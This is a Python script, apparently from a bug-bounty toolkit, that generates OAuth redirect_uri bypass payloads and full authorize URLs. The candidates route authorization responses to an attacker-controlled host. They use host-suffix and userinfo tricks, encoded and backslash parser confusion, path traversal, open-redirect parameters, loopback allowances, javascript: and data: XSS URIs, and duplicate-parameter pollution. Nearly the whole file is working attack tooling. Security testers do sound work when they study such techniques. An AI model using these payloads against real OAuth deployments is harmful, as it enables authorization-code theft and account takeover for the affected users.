#!/usr/bin/env python3
"""Generate redirect_uri bypass candidates for OA-03 / OA-04 / OA-30 (offline).

Usage:
  redirect_uri_variants.py --registered https://app.example.com/oauth/callback --attacker COLLAB.host
                           [--authorize https://auth.example.com/authorize --param client_id=X --param response_type=code ...]
                           [--gadget '/redirect?url={attacker}']   # known open-redirect / proxy page on the app

Output (TSV): category <TAB> redirect_uri <TAB> full authorize URL (if --authorize given)
Feed the TSV to probe_authorize.sh for a pre-auth validation differential, then confirm
promising rows manually in your own victim browser profile.
"""
import argparse
import sys
from urllib.parse import quote, urlencode, urlsplit


def variants(reg, atk, gadgets):
    u = urlsplit(reg)
    scheme, host, path = u.scheme, u.hostname or "", u.path or "/"
    port = f":{u.port}" if u.port else ""
    base = f"{scheme}://{host}{port}"
    parts = host.split(".")
    apex = ".".join(parts[-2:]) if len(parts) >= 2 else host
    a = atk
    out = []
    add = lambda cat, v: out.append((cat, v))

    # baseline + exact-match drift
    add("baseline", reg)
    add("drift-trailing-slash", reg.rstrip("/") + "/" if not reg.endswith("/") else reg.rstrip("/"))
    add("drift-case", f"{scheme}://{host.upper()}{port}{path}")
    add("drift-http", f"http://{host}{port}{path}")
    add("drift-port", f"{scheme}://{host}:{443 if scheme == 'https' else 80}{path}")
    add("drift-port-odd", f"{scheme}://{host}:8443{path}")
    add("drift-extra-query", reg + ("&" if "?" in reg else "?") + "bbtest=1")
    add("drift-fragment", reg + "#bbtest")
    add("drift-subpath", reg.rstrip("/") + "/bbtest")
    # attacker host directly
    add("external", f"https://{a}/")
    add("external-same-path", f"https://{a}{path}")
    # prefix / suffix / subdomain matching
    add("suffix-host", f"{scheme}://{host}.{a}{path}")
    add("prefix-host", f"{scheme}://{a}.{host}{path}")
    add("evil-prefix-label", f"{scheme}://evil{host}{path}")
    add("evil-subdomain", f"{scheme}://bbtest.{apex}{path}")
    add("apex-suffix", f"{scheme}://{apex}.{a}{path}")
    add("registered-as-path", f"https://{a}/{host}{path}")
    add("registered-as-query", f"https://{a}/?r={quote(reg, safe='')}")
    # authority / parser confusion
    add("userinfo", f"{scheme}://{host}@{a}{path}")
    add("userinfo-port", f"{scheme}://{host}:443@{a}{path}")
    add("fragment-at", f"https://{a}#@{host}{path}")
    add("backslash", f"{scheme}://{a}\\@{host}{path}")
    add("backslash-2", f"{scheme}://{host}\\.{a}{path}")
    add("space-amp-at", f"{scheme}://{host}%20%26@{a}#@{host}{path}")
    add("encoded-at", f"{scheme}://{host}%40{a}{path}")
    add("encoded-dot", f"{scheme}://{host}%2e{a}{path}")
    add("question-host", f"{scheme}://{a}?{host}{path}")
    add("semicolon", f"{scheme}://{host};@{a}{path}")
    add("null-byte", f"{scheme}://{a}%00{host}{path}")
    add("unicode-dot", f"{scheme}://{host}\u3002{a}{path}")
    add("triple-slash", f"{scheme}:///{a}{path}")
    add("scheme-relative", f"//{a}{path}")
    # path traversal on the registered host (needs a gadget page / open redirect on the client)
    add("traversal", f"{base}{path.rstrip('/')}/../")
    add("traversal-encoded", f"{base}{path.rstrip('/')}/%2e%2e/")
    add("traversal-double-encoded", f"{base}{path.rstrip('/')}/%252e%252e/")
    add("traversal-semicolon", f"{base}{path.rstrip('/')}/..;/")
    add("traversal-slash-encoded", f"{base}{path.rstrip('/')}%2f..%2f..%2f")
    add("traversal-no-slash", f"{base}{path.rstrip('/')}../")
    # parameter-based open redirect appended to the callback
    for pname in ("next", "url", "redirect", "redirect_uri", "return", "returnTo", "continue", "path", "to"):
        add("callback-param-" + pname, f"{reg}{'&' if '?' in reg else '?'}{pname}=https://{a}/")
    for g in gadgets:
        gp = g.replace("{attacker}", f"https://{a}/")
        add("gadget", f"{base}{gp}")
        add("gadget-via-traversal", f"{base}{path.rstrip('/')}/..{gp if gp.startswith('/') else '/' + gp}")
    # localhost / loopback allowances
    add("localhost", f"http://localhost{path}")
    add("localhost-prefix", f"https://localhost.{a}{path}")
    add("loopback-ip", f"http://127.0.0.1{path}")
    add("loopback-ipv6", f"http://[::1]{path}")
    # scheme tricks (mobile/custom schemes, javascript)
    add("javascript", "javascript://%0aalert(document.domain)//")
    add("data", "data:text/html,<script>alert(document.domain)</script>")
    add("custom-scheme", f"{host.split('.')[0]}://callback")
    return out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--registered", required=True)
    ap.add_argument("--attacker", required=True, help="host you control, e.g. xyz.oastify.com")
    ap.add_argument("--authorize", help="authorization endpoint URL")
    ap.add_argument("--param", action="append", default=[], help="extra authorize param k=v (repeatable)")
    ap.add_argument("--gadget", action="append", default=[], help="open-redirect path on the client, use {attacker}")
    a = ap.parse_args()
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if "://" in a.attacker:
        a.attacker = urlsplit(a.attacker).hostname
    params = []
    for p in a.param:
        if "=" not in p:
            sys.exit(f"--param must be k=v: {p}")
        params.append(tuple(p.split("=", 1)))
    seen = set()
    print("category\tredirect_uri\tauthorize_url")
    for cat, v in variants(a.registered, a.attacker, a.gadget):
        if v in seen:
            continue
        seen.add(v)
        full = ""
        if a.authorize:
            q = [(k, val) for k, val in params if k != "redirect_uri"] + [("redirect_uri", v), ("state", "bbtest")]
            sep = "&" if "?" in a.authorize else "?"
            full = a.authorize + sep + urlencode(q)
        print(f"{cat}\t{v}\t{full}")
    # HTTP parameter pollution: two redirect_uri params (only meaningful with --authorize)
    if a.authorize:
        q = [(k, val) for k, val in params if k != "redirect_uri"]
        sep = "&" if "?" in a.authorize else "?"
        for order in ((a.registered, f"https://{a.attacker}/"), (f"https://{a.attacker}/", a.registered)):
            full = a.authorize + sep + urlencode(q + [("redirect_uri", order[0]), ("redirect_uri", order[1]), ("state", "bbtest")])
            print(f"hpp-duplicate-param\t{order[0]} | {order[1]}\t{full}")


if __name__ == "__main__":
    main()
